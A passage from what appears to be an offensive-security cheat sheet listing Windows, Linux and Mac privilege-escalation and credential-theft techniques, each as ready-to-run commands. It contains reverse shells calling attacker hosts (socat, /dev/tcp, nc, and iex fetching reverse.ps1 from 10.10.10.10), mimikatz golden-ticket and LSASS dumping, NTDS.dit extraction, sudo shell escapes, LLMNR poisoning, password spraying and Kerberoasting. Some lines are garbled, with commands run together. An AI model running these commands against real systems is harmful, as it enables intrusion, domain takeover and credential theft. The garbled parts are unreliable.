
OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe SecPackageCreds

<!-- TOC --><a name="password-mining-in-puttyhostkeys"></a>
# Password Mining in PuttyHostKeys

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe PuttyHostKeys

<!-- TOC --><a name="password-mining-in-rdcmanfiles"></a>
# Password Mining in RDCManFiles

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe RDCManFiles

<!-- TOC --><a name="password-mining-in-rdpsavedconnections"></a>
# Password Mining in RDPSavedConnections

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

Seatbelt.exe RDPSavedConnections

<!-- TOC --><a name="password-mining-in-masterkeys"></a>
# Password Mining in MasterKeys

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpDPAPI masterkeys

<!-- TOC --><a name="password-mining-in-browsers"></a>
# Password Mining in Browsers

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpWeb.exe all

<!-- TOC --><a name="password-mining-in-files"></a>
# Password Mining in Files

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SauronEye.exe -d C:\\Users\\vincent\\Desktop\\ \--filetypes .txt .doc
.docx .xls \--contents \--keywords password pass\* -v\`

<!-- TOC --><a name="password-mining-in-ldap"></a>
# Password Mining in LDAP

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

SharpLDAPSearch.exe \"(&(objectClass=user)(cn=\*svc\*))\"
\"samaccountname\"

Or

Import-Module .\\PowerView.ps1

Get-DomainComputer COMPUTER -Properties
ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime

<!-- TOC --><a name="password-mining-in-clipboard"></a>
# Password Mining in Clipboard

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

execute-assembly /root/SharpClipHistory.exe

<!-- TOC --><a name="password-mining-in-gmsa-password"></a>
# Password Mining in GMSA Password

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

1\.

GMSAPasswordReader.exe \--accountname SVC_SERVICE_ACCOUNT

<!-- TOC --><a name="delegate-tokens-via-rdp"></a>
# Delegate tokens via RDP

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Delegate tokens

Methods:

1\.

./fake_rdp.py

Or

pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem

<!-- TOC --><a name="delegate-tokens-via-ftp"></a>
# Delegate tokens via FTP

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Delegate tokens

Methods:

1\.

FakeFtpServer fakeFtpServer = new FakeFtpServer();

fakeFtpServer.addUserAccount(new UserAccount(\"user\", \"password\",
\"c:\\\\data\"));

FileSystem fileSystem = new WindowsFakeFileSystem();

fileSystem.add(new DirectoryEntry(\"c:\\\\data\"));

fileSystem.add(new FileEntry(\"c:\\\\data\\\\file1.txt\", \"abcdef
1234567890\"));

fileSystem.add(new FileEntry(\"c:\\\\data\\\\run.exe\"));

fakeFtpServer.setFileSystem(fileSystem);

fakeFtpServer.start();

<!-- TOC --><a name="fake-logon-screen"></a>
# Fake Logon Screen

Domain: No

Local Admin: Yes

OS: Windows

Type: Delegate tokens

Methods:

1\.

execute-assembly fakelogonscreen.exe

<!-- TOC --><a name="abusing-winrm-services"></a>
# Abusing WinRM Services

Domain: No

Local Admin: Yes

OS: Windows

Type: Abuse Service

Methods:

1\.

RogueWinRM.exe -p C:\\windows\\system32\\cmd.exe


<!-- TOC --><a name="abusing-sudo-binaries"></a>
# Abusing Sudo Binaries

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Privileged Files

Methods:

1.  sudo vim -c \':!/bin/bash\'

2.  sudo find / etc/passwd -exec /bin/bash \\;

3.  echo \"os.execute(\'/bin/bash/\')\" \> /tmp/shell.nse && sudo nmap
    > \--script=/tmp/shell.nse

4.  sudo env /bin/bash

5.  sudo awk \'BEGIN {system(\"/bin/bash\")}\'

6.  sudo perl -e \'exec \"/bin/bash\";\'

7.  sudo python -c \'import pty;pty.spawn(\"/bin/bash\")\'

8.  sudo less /etc/hosts - !bash

9.  sudo man man - !bash

10. sudo ftp - ! /bin/bash

11. Attacker = socat file:\`tty\`,raw,echo=0 tcp-listen:1234

12. Victim = sudo socat exec:\'sh -li\',pty,stderr,setsid,sigint,sane
    > tcp:192.168.1.105:1234

13. echo test \> notes.txt

14. sudo zip test.zip notes.txt -T \--unzip-command=\"sh -c /bin/bash\"

15. sudo gcc -wrapper /bin/bash,-s .

16. sudo docker run -v /:/mnt \--rm -it alpine chroot /mnt sh

17. sudo mysql -e \'\\! /bin/sh\'

18. sudo ssh -o ProxyCommand=\';sh 0\<&2 1\>&2\' x

19. Sudo tmux

20. sudo pkexec /bin/bash

21. sudo rlwrap /bin/bash

22. sudo xargs -a /dev/null sh

23. sudo /home/anansi/bin/anansi_util manual /bin/bash

24. sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"

25. echo \'import pty; pty.spawn("/bin/bash")\' \> flask.py

26. export FLASK_APP=flask.py

27. sudo /usr/bin/flask run

28. sudo apache2 -f /etc/shadow\
    > john hash \--wordlist=/usr/share/wordlists/rockyou.txt

<!-- TOC --><a name="abusing-scheduled-tasks"></a>
# Abusing Scheduled Tasks

Domain: Y/N

Local Admin: Yes

OS: Linux

Type: Abusing Scheduled Tasks

Methods:

1.  echo \'chmod +s /bin/bash\' \> /home/user/systemupdate.sh

2.  chmod +x /home/user/systemupdate.sh

3.  Wait a while

4.  /bin/bash -p

5.  id && whoami

<!-- TOC --><a name="golden-ticket-with-scheduled-tasks"></a>
# Golden Ticket With Scheduled Tasks

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Scheduled Tasks

Methods:

1.mimikatz\# token::elevate

2.mimikatz\# vault::cred /patch

3.mimikatz\# lsadump::lsa /patch

4.mimikatz\# kerberos::golden /user:Administrator /rc4:\<Administrator
NTLM(step 3)\> /domain:\<DOMAIN\> /sid:\<USER SID\>
/sids:\<Administrator SIDS\> /ticket:\<OUTPUT TICKET PATH\>

5.powercat -l -v -p 443

6.schtasks /create /S DOMAIN /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN
\"enterprise\" /TR \"powershell.exe-c \'iex (iwr
http://10.10.10.10/reverse.ps1)\'"

7.schtasks /run /s DOMAIN /TN \"enterprise"

<!-- TOC --><a name="abusing-interpreter-capabilities"></a>
# Abusing Interpreter Capabilities

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

1.  getcap -r / 2\>/dev/null

    a.  /usr/bin/python2.6 = cap_setuid+ep

    b.  /usr/bin/python2.6 -c \'import os; os.setuid(0);
        > os.system(\"/bin/bash\")\'

    c.  id && whoami

2.  getcap -r / 2\>/dev/null

    a.  /usr/bin/perl = cap_setuid+ep

    b.  /usr/bin/perl -e \'use POSIX (setuid); POSIX::setuid(0); exec
        > \"/bin/bash\";\'

    c.  id && whoami

<!-- TOC --><a name="abusing-binary-capabilities"></a>
# Abusing Binary Capabilities

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

1.  getcap -r / 2\>/dev/null

    a.  /usr/bin/tar = cap dac read search+ep

    b.  /usr/bin/tar -cvf key.tar /root/.ssh/id_rsa

    c.  /usr/bin/tar -xvf key.tar

2.  openssl req -engine /tmp/priv.so

    a.  /bin/bash -p

    b.  id && whoami

<!-- TOC --><a name="abusing-activesessions-capabilities"></a>
# Abusing ActiveSessions Capabilities

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Capabilities

Methods:

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-SQLOSCmd.ps1

. .\\Heidi.ps1

Invoke-SQLOCmd -Verbose -Command "net localgroup administrators user1
/add" -Instance COMPUTERNAME

<!-- TOC --><a name="escalate-with-trustworthy-in-sql-server"></a>
# Escalate with TRUSTWORTHY in SQL Server

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Capabilities

Methods:

1\. . .\\PowerUpSQL.ps1

2\. Get-SQLInstanceLocal -Verbose

3\. (Get-SQLServerLinkCrawl -Verbos -Instance \"10.10.10.10\" -Query
\'select \* from master..sysservers\').customer.query

4\.

USE \"master\";

SELECT \*, SCHEMA_NAME(\"schema_id\") AS \'schema\' FROM
\"master\".\"sys\".\"objects\" WHERE \"type\" IN (\'P\', \'U\', \'V\',
\'TR\', \'FN\', \'TF, \'IF\');

execute(\'sp_configure \"xp_cmdshell\",1;RECONFIGURE\') at
\"\<DOMAIN\>\\\<DATABASE NAME\>\"

5\. powershell -ep bypass

6\. Import-Module .\\powercat.ps1

7\. powercat -l -v -p 443 -t 10000

8\.

SELECT \*, SCHEMA_NAME(\"schema_id\") AS \'schema\' FROM
\"master\".\"sys\".\"objects\" WHERE \"type\" IN (\'P\', \'U\', \'V\',
\'TR\', \'FN\', \'TF, \'IF\');

execute(\'sp_configure \"xp_cmdshell\",1;RECONFIGURE\') at
\"\<DOMAIN\>\\\<DATABASE NAME\>\"

execute(\'exec master..xp_cmdshell \"\\\\10.10.10.10\\reverse.exe\"\')
at \"\<DOMAIN\>\\\<DATABASE NAME\>\"

<!-- TOC --><a name="abusing-mysql-run-as-root"></a>
# Abusing Mysql run as root

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

-   ps aux \| grep root

> mysql -u root -p
>
> \\! chmod +s /bin/bash
>
> Exit
>
> /bin/bash -p
>
> id && whoami

<!-- TOC --><a name="abusing-journalctl"></a>
# Abusing journalctl

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Services

Methods:

-   Journalctl

-   !/bin/sh

<!-- TOC --><a name="abusing-vds"></a>
# Abusing VDS

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

. .\\PowerUp.ps1

Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\\user1'

<!-- TOC --><a name="abusing-browser"></a>
# Abusing Browser

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing Services

Methods:

. .\\PowerUp.ps1

Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\\user1'

<!-- TOC --><a name="abusing-ldap"></a>
# Abusing LDAP

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Abusing Services

Methods:

0\. exec ldapmodify -x -w PASSWORD

1\. paste this

dn: cn=openssh-lpk,cn=schema,cn=config

objectClass: olcSchemaConfig

cn: openssh-lpk

olcAttributeTypes: ( 1.3.6.1.4.1.24552.500.1.1.1.13 NAME
\'sshPublicKey\'

DESC \'MANDATORY: OpenSSH Public key\'

EQUALITY octetStringMatch

SYNTAX 1.3.6.1.4.1.1466.115.121.1.40 )

olcObjectClasses: ( 1.3.6.1.4.1.24552.500.1.1.2.0 NAME \'ldapPublicKey\'
SUP top AUXILIARY

DESC \'MANDATORY: OpenSSH LPK objectclass\'

MAY ( sshPublicKey \$ uid )

)

2\. exec ldapmodify -x -w PASSWORD

3\. paste this

dn: uid=UID,ou=users,ou=linux,ou=servers,dc=DC,dc=DC

changeType: modify

add: objectClass

objectClass: ldapPublicKey

\-

add: sshPublicKey

sshPublicKey: content of id_rsa.pub

\-

replace: EVIL GROUP ID

uidNumber: CURRENT USER ID

\-

replace: EVIL USER ID

gidNumber: CURRENT GROUP ID

<!-- TOC --><a name="llmnr-poisoning"></a>
# LLMNR Poisoning

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Service

Methods:

1.responder -I eth1 -v

2.create Book.url

\[InternetShortcut\]

URL=[[https://facebook.com]{.ul}](https://facebook.com)

IconIndex=0

IconFile=\\\\attacker_ip\\not_found.ico

<!-- TOC --><a name="abusing-certificate-services"></a>
# Abusing Certificate Services

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Service

Methods:

adcspwn.exe \--adcs \<cs server\> \--port \[local port\] \--remote
\[computer\]

adcspwn.exe \--adcs cs.pwnlab.local

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local \--port
9001

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local \--output
C:\\Temp\\cert_b64.txt

adcspwn.exe \--adcs cs.pwnlab.local \--remote dc.pwnlab.local
\--username pwnlab.local\\mranderson \--password The0nly0ne! \--dc
dc.pwnlab.local

<!-- TOC --><a name="mysql-udf-code-injection"></a>
# MySQL UDF Code Injection

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

mysql -u root -p

mysql\> use mysql;

mysql\> create table admin(line blob);

mysql\> insert into admin
values(load_file(\'/tmp/lib_mysqludf_sys.so\'));

mysql\> select \* from admin into dumpfile
\'/usr/lib/lib_mysqludf_sys.so\';

mysql\> create function sys_exec returns integer soname
\'lib_mysqludf_sys.so\';

mysql\> select sys_exec(\'bash -i \>& /dev/tcp/10.10.10.10/9999
0\>&1\');

<!-- TOC --><a name="impersonation-token-with-impersonateloggedonuser"></a>
# Impersonation Token with ImpersonateLoggedOnuser

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.SharpImpersonation.exe user:\<user\> shellcode:\<URL\>

2.SharpImpersonation.exe user:\<user\> technique:ImpersonateLoggedOnuser

# 

<!-- TOC --><a name="impersonation-token-with-seimpersonteprivilege"></a>
# Impersonation Token with SeImpersontePrivilege

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.execute-assembly sweetpotato.exe -p beacon.exe

# 

<!-- TOC --><a name="impersonation-token-with-seloaddriverprivilege"></a>
# Impersonation Token with SeLoadDriverPrivilege

Domain: No

Local Admin: Yes

OS: Windows

Type: Injection

Methods:

1.EOPLOADDRIVER.exe System\\\\CurrentControlSet\\\\MyService
C:\\\\Users\\\\Username\\\\Desktop\\\\Driver.sys

<!-- TOC --><a name="openvpn-credentials"></a>
# OpenVPN Credentials

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Enumeration & Hunt

Methods:

locate \*.ovpn

<!-- TOC --><a name="bash-history"></a>
# Bash History

Domain: No

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunt

Methods:

-   history

> cat /home/\<user\>/.bash_history
>
> cat \~/.bash_history \| grep -i passw

<!-- TOC --><a name="package-capture"></a>
# Package Capture

Domain: No

Local Admin: Yes

OS: Windows/Linux

Type: Sniff

Methods:

locate:

-   tcpdump -nt -r capture.pcap -A 2\>/dev/null \| grep -P \'pwd=\'

<!-- TOC --><a name="nfs-root-squashing"></a>
# NFS Root Squashing

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Remote Procedure Calls (RPC)

Methods:

-   showmount -e \<victim_ip\>

> mkdir /tmp/mount
>
> mount -o rw,vers=2 \<victim_ip\>:/tmp /tmp/mount
>
> cd /tmp/mount
>
> cp /bin/bash .
>
> chmod +s bash

<!-- TOC --><a name="abusing-access-control-list"></a>
# Abusing Access Control List

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   \$user = \"megacorp\\jorden\"

> \$folder = \"C:\\Users\\administrator\"
>
> \$acl = get-acl \$folder
>
> \$aclpermissions = \$user, \"FullControl\", \"ContainerInherit,
> ObjectInherit\", \"None\", \"Allow\"
>
> \$aclrule = new-object
> System.Security.AccessControl.FileSystemAccessRule \$aclpermissions
>
> \$acl.AddAccessRule(\$aclrule)
>
> set-acl -path \$folder -AclObject \$acl
>
> get-acl \$folder \| folder

<!-- TOC --><a name="escalate-with-sebackupprivilege"></a>
# Escalate With SeBackupPrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

import-module .\\SeBackupPrivilegeUtils.dll

import-module .\\SeBackupPrivilegeCmdLets.dll

Copy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit
C:\\temp\\ndts.dit

<!-- TOC --><a name="escalate-with-seimpersonateprivilege"></a>
# Escalate With SeImpersonatePrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

https://github.com/dievus/printspoofer

printspoofer.exe -i -c \"powershell -c whoami\"

<!-- TOC --><a name="escalate-with-seloaddriverprivilege"></a>
# Escalate With SeLoadDriverPrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

FIRST:

Download
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

Download
https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp

Download https://github.com/tandasat/ExploitCapcom

change ExploitCapcom.cpp line 292

TCHAR CommandLine\[\] = TEXT(\"C:\\\\Windows\\\\system32\\\\cmd.exe\");

to

TCHAR CommandLine\[\] = TEXT(\"C:\\\\test\\\\shell.exe\");

then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe

SECOND:

1\. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4
LPORT=4444 -f exe \> shell.exe

2\. .\\eoploaddriver.exe System\\CurrentControlSet\\MyService
C:\\test\\capcom.sys

3\. .\\ExploitCapcom.exe

4\. in msf exec \`run\`

<!-- TOC --><a name="escalate-with-forcechangepassword"></a>
# Escalate With ForceChangePassword

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Import-Module .\\PowerView_dev.ps1

Set-DomainUserPassword -Identity user1 -verbose

Enter-PSSession -ComputerName COMPUTERNAME -Credential ""

<!-- TOC --><a name="escalate-with-genericwrite"></a>
# Escalate With GenericWrite

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

\$pass = ConvertTo-SecureString \'Password123\#\' -AsPlainText -Force

\$creds = New-Object
System.Management.Automation.PSCredential(\'DOMAIN\\MASTER USER\'),
\$pass)

Set-DomainObject -Credential \$creds USER1 -Clear serviceprincipalname

Set-DomainObject -Credential \$creds -Identity USER1 -SET
@{serviceprincipalname=\'none/fluu\'}

.\\Rubeus.exe kerberoast /domain:\<DOMAIN\>

<!-- TOC --><a name="abusing-gpo"></a>
# Abusing GPO

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1..\\SharpGPOAbuse.exe \--AddComputerTask \--Taskname \"Update\"
\--Author DOMAIN\\\<USER\> \--Command \"cmd.exe\" \--Arguments \"/c net
user Administrator Password!@\# /domain\" \--GPOName \"ADDITIONAL DC
CONFIGURATION\"

<!-- TOC --><a name="pass-the-ticket"></a>
# Pass-the-Ticket

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Ticket

Methods:

1..\\Rubeus.exe asktgt /user:\<USET\>\$ /rc4:\<NTLM HASH\> /ptt

2.klist

<!-- TOC --><a name="golden-ticket"></a>
# Golden Ticket

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Ticket

Methods:

1.mimikatz \# lsadump::dcsync /user:\<USER\>

2.mimikatz \# kerberos::golden /user:\<USER\> /domain:\</DOMAIN\>
/sid:\<OBJECT SECURITY ID\> /rce:\<NTLM HASH\> /id:\<USER ID\>

<!-- TOC --><a name="abusing-splunk-universal-forwarder"></a>
# Abusing Splunk Universal Forwarder

Domain: No

Local Admin: Yes

OS: Linux/Windows

Type: Abuse Channel

Methods:

python PySplunkWhisperer2_remote.py \--lhost 10.10.10.5 \--host
10.10.15.20 \--username admin \--password admin \--payload \'/bin/bash
-c \"rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11\|/bin/sh -i
2\>&1\|nc 10.10.10.5 5555 \>/tmp/luci11\"\'

<!-- TOC --><a name="abusing-gdbus"></a>
# Abusing Gdbus

Domain: No

Local Admin: Yes

OS: Linux

Type: Abuse Channel

Methods:

gdbus call \--system \--dest com.ubuntu.USBCreator \--object-path
/com/ubuntu/USBCreator \--method com.ubuntu.USBCreator.Image
/home/nadav/authorized_keys /root/.ssh/authorized_keys true

<!-- TOC --><a name="abusing-trusted-dc"></a>
# Abusing Trusted DC

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Channel

Methods:

1.  Find user in First DC

2.  If port 6666 enabled

3.  proxychains evil-winrm -u user -p \'pass\' -i 10.100.9.253 -P 6666

4.  . \\mimikatz. exe \"privilege:: debug\" \"sekurlsa::
    > logonpasswords\" \"token:: elevate\" \*lsadump:: secrets\*
    > \*exit\"

5.  proxychains evil-winrm -u Administrator -p \'pass dumped in step 4\'
    > -i 10.100.10.100 -P 6666

<!-- TOC --><a name="ntlm-relay"></a>
# NTLM Relay 

Domain: Yes

Local Admin: Y/N

OS: Windows

Methods:

responder -I eth1 -v

ntlmrelayx.py ...

<!-- TOC --><a name="exchange-relay"></a>
# Exchange Relay 

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: NTLM

Methods:

./exchangeRelayx.py ...

<!-- TOC --><a name="dumping-with-diskshadow"></a>
# Dumping with diskshadow

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Dumping

Methods:

1\. priv.txt contain

SET CONTEXT PERSISTENT NOWRITERSp

add volume c: alias 0xprashantp

createp

expose %0xprashant% z:p

2\. exec with diskshadow /s priv.txt

<!-- TOC --><a name="dumping-with-vssadmin"></a>
# Dumping with vssadmin

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Dumping

Methods:

vssadmin create shadow /for=C:

copy
\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit
C:\\ShadowCopy

copy
\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM
C:\\ShadowCopy./kerbrute_linux_amd64 passwordspray -d domain.local \--dc
10.10.10.10 domain_users.txt Password123

<!-- TOC --><a name="password-spraying"></a>
# Password Spraying

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Spraying

Methods:

./kerbrute_linux_amd64 passwordspray -d domain.local \--dc 10.10.10.10
domain_users.txt Password123

<!-- TOC --><a name="as-rep-roasting"></a>
# AS-REP Roasting

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Kerberos

Methods:

.\\Rubeus.exe asreproast

<!-- TOC --><a name="kerberoasting"></a>
# Kerberoasting

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Kerberos

Methods:

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip
10.10.10.100 -request

crackmapexec ldap 10.0.2.11 -u \'username\' -p \'password\' \--kdcHost
10.0.2.11 \--kerberoast output.txt

<!-- TOC --><a name="dump-lsass-with-silentprocessexit"></a>
# Dump lsass with SilentProcessExit

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

1.  SilentProcessExit.exe pid

<!-- TOC --><a name="lsass-shtinkering"></a>
# Lsass Shtinkering

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

1.  HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error
    > Reporting\\LocalDumps-\>2

2.  LSASS_Shtinkering.exe pid

<!-- TOC --><a name="andrewspecial"></a>
# AndrewSpecial

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

-   AndrewSpecial.exe

<!-- TOC --><a name="ccache-ticket-reuse-from-tmp"></a>
# CCACHE ticket reuse from /tmp

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   ls /tmp/ \| grep krb5cc_X

-   export KRB5CCNAME=/tmp/krb5cc_X

<!-- TOC --><a name="ccache-ticket-reuse-from-keyring"></a>
# CCACHE ticket reuse from keyring

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   https://github.com/TarlogicSecurity/tickey

-   /tmp/tickey -i

<!-- TOC --><a name="ccache-ticket-reuse-from-sssd-kcm"></a>
# CCACHE ticket reuse from SSSD KCM

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   git clone https://github.com/fireeye/SSSDKCMExtractor

-   python3 SSSDKCMExtractor.py \--database secrets.ldb \--key
    > secrets.mkey

<!-- TOC --><a name="ccache-ticket-reuse-from-keytab"></a>
# CCACHE ticket reuse from keytab

Domain: Yes

Local Admin: Yes

OS: Linux/Windows/Mac

Type: Enumeration & Hunting

Methods:

-   git clone https://github.com/its-a-feature/KeytabParser

-   python KeytabParser.py /etc/krb5.keytab

-   klist -k /etc/krb5.keytab

> Or

-   klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab

-   python3 keytabextract.py krb5.keytab

-   ./bifrost -action dump -source keytab -path test

<!-- TOC --><a name="ssh-forwarder"></a>
# SSH Forwarder

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   ForwardAgent yes

-   SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob\@boston

AppleScript

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

-   (EmPyre) \> listeners

-   (EmPyre: listeners) \> set Name mylistener

-   (EmPyre: listeners) \> execute

-   (EmPyre: listeners) \> usestager applescript mylistener

-   (EmPyre: stager/applescript) \> execute

<!-- TOC --><a name="dll-search-order-hijacking"></a>
# DLL Search Order Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie

-   Brownie

<!-- TOC --><a name="slui-file-handler-hijack-lpe"></a>
# Slui File Handler Hijack LPE

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation

-   Slui.exe

<!-- TOC --><a name="cdpsvc-dll-hijacking"></a>
# CDPSvc DLL Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   Cdpsgshims.exe

<!-- TOC --><a name="magnifyexe-dll-search-order-hijacking"></a>
# Magnify.exe Dll Search Order Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   copy payload dll as igdgmm64.dll to SYSTEM path %PATH% which is
    > writeable such as C:\\python27

-   Press WinKey+L

-   Press Enter

-   Press WinKey++(plusKey) on login screen which show password box.

-   then payload dll will execute as SYSTEM access.

<!-- TOC --><a name="cdpsvc-service"></a>
# CdpSvc Service 

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   Find Writable SYSTEM PATH with acltest.ps1 (such as C:\\python27)

-   C:\\CdpSvcLPE\> powershell -ep bypass \". .\\acltest.ps1\"

-   Copy cdpsgshims.dll to C:\\python27

-   make C:\\temp folder and copy impersonate.bin to C:\\temp

-   C:\\CdpSvcLPE\> mkdir C:\\temp

-   C:\\CdpSvcLPE\> copy impersonate.bin C:\\temp

-   Reboot (or stop/start CDPSvc as an administrator)

-   cmd wil prompt up with nt authority\\system.

<!-- TOC --><a name="hivenightmare"></a>
# HiveNightmare

Domain: Yes

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

-   HiveNightmare.exe 200

CVE-2021-30655

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

-   https://github.com/thehappydinoa/rootOS

-   Python rootOS.py

CVE-2019-8526

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2020-9771

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2021-3156

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2018-4280

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   https://github.com/bazad/launchd-portrep

-   ./launchd-portrep \'touch /tmp/exploit-success\'=

<!-- TOC --><a name="abusing-with-filerestoreprivilege"></a>
# Abusing with FileRestorePrivilege

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

<!-- TOC --><a name="abusing-with-restoreandbackupprivileges"></a>
# Abusing with RestoreAndBackupPrivileges

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

<!-- TOC --><a name="abusing-with-shadowcopybackupprivilege"></a>
# Abusing with ShadowCopyBackupPrivilege

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

<!-- TOC --><a name="abusing-with-shadowcopy"></a>
# Abusing with ShadowCopy

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

<!-- TOC --><a name="dynamic-phishing"></a>
# Dynamic Phishing

Domain: Y/N

Local Admin: Yes

OS: Mac

Type: Phish

Methods:

-   https://github.com/thehappydinoa/rootOS

-   Python rootOS.py

<!-- TOC --><a name="race-conditions"></a>
# Race Conditions

Domain: No

Local Admin: Yes

OS: Windows

Type: Race Condition

Methods:

-   echo \"net localgroup administrators attacker /add\" \>
    > C:\\temp\\not-evil.bat

-   tempracer.exe C:\\ temp\\\*.bat

<!-- TOC --><a name="abusing-usermode-helper-api"></a>
# Abusing usermode helper API

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

